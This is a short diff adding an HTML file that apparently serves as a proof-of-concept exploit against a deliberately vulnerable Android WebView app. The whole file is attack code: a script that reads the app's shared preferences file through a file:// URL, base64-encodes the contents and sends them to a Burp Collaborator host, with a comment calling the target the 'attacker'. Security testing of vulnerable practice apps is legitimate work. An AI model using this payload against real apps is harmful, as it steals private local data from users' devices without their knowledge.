@@ -1,0 +1,15 @@
+<script>
+    var url = 'file:///data/data/com.tmh.vulnwebview/shared_prefs/MainActivity.xml'; //local file
+    function load(url) {
+        var xhr = new XMLHttpRequest();
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+                fetch('https://8ktm71h4wjnqo72wgqbzvnr7jypodd.burpcollaborator.net/?exfiltrated=' + btoa(xhr.responseText)); 
+                //send b64 encoded file to attacker
+            }
+        }
+        xhr.open('GET', url, true);
+        xhr.send('');
+    }
+    load(url)
+</script>
